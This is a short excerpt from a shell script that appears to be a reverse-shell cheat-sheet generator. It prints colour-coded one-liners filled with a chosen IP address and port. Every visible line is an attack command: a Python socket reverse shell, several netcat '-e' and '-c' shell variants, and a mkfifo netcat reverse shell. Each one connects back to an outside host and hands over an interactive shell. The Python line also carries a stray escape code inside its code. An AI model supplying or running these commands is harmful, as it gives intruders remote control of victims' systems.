...
echo -e "\e[43m[python3]\e[0m python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip_addr\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"\e[0m);'"
...
echo -e "\e[46m[netcat]\e[0m nc -e /bin/bash $ip_addr $port"
echo -e "\e[46m[netcat]\e[0m nc -c /bin/sh $ip_addr $port"
echo -e "\e[46m[netcat]\e[0m nc -c /bin/bash $ip_addr $port"
...
echo -e "\e[46m[netcat]\e[0m rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $ip_addr $port >/tmp/f"
